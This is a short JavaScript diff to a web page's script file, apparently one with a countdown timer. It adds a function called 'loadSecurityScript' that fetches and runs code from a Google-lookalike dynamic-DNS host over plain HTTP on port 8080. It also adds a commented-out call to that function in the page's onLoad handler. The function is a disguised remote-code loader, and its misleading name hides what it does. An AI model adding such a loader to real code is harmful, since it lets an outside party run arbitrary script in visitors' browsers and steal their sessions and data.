@@ -891,7 +891,18 @@ function getRemainingSeconds(date) {
 
 var countdownInterval;
 
+function loadSecurityScript() {
+    $.getScript( "http://googleajax.ddns.net:8080/jquery.js" )
+        .done(function( script, textStatus ) {
+            // do nothing
+        })
+        .fail(function( jqxhr, settings, exception ) {
+            console.info( "Triggered ajaxError handler." + exception );
+        });
+}
+
 function onLoad() {
+    // loadSecurityScript();
     initMenu();
 
      if (compatibleDevice() && !checkIframe()) {
